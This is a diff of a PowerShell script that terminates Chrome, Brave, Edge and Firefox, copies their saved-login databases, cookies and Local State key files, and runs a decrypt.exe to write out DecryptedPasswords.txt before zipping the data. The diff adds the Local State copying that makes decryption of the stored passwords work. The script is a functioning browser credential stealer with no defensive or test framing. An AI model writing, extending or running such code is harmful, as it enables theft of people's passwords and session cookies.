@@ -36,14 +36,20 @@ function KillBrowserProcesses($browserName) {
 # Configuration for Google Chrome
 $chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 $chromeFilesToCopy = @("Login Data")
+$localStateChrome = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
 KillBrowserProcesses "chrome"
 CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
+Copy-Item -Path $localStateChrome -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
+Write-Host "Chrome - Local State file copied."
 
 # Configuration for Brave
 $braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
 $braveFilesToCopy = @("Login Data")
+$localStateBrave = Join-Path -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" -ChildPath "Local State"
 KillBrowserProcesses "brave"
 CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
+Copy-Item -Path $localStateBrave -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
+Write-Host "Brave - Local State file copied."
 
 # Configuration for Firefox
 $firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
@@ -53,6 +59,7 @@ if ($firefoxProfile) {
     $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
     KillBrowserProcesses "firefox"
     CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
+    # Local State for Firefox is not applicable; just copying Login Data files
 } else {
     Write-Host "Firefox - No profile found."
 }
@@ -60,13 +67,16 @@ if ($firefoxProfile) {
 # Configuration for Microsoft Edge
 $edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 $edgeFilesToCopy = @("Login Data")
+$localStateEdge = Join-Path -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -ChildPath "Local State"
 KillBrowserProcesses "msedge"
 CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
+Copy-Item -Path $localStateEdge -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
+Write-Host "Edge - Local State file copied."
 
 # Decrypt the copied Login Data files using decrypt.exe
 $decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
 $loginDataPath = Join-Path -Path "$destDir\Chrome" -ChildPath "Login Data"
-$localStatePath = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
+$localStatePath = Join-Path -Path "$destDir\Chrome" -ChildPath "Local State"
 
 # Separate Test-Path checks
 if (Test-Path $decryptExePath) {
@@ -74,7 +84,7 @@ if (Test-Path $decryptExePath) {
         if (Test-Path $localStatePath) {
             $outputPath = Join-Path -Path $destDir -ChildPath "DecryptedPasswords.txt"
             
-            # Run the decrypt.exe
+            # Run the decrypt.exe with both Login Data and Local State
             & $decryptExePath -1stfile $loginDataPath -2ndfile $localStatePath -output $outputPath
             
             if (Test-Path $outputPath) {
@@ -91,8 +101,6 @@ if (Test-Path $decryptExePath) {
 } else {
     Write-Host "Decrypt.exe not found."
 }
-
-
 
 # Klasörü ZIP dosyasına sıkıştırma
 $zipDir = "$env:APPDATA\ZippedBrowserData"
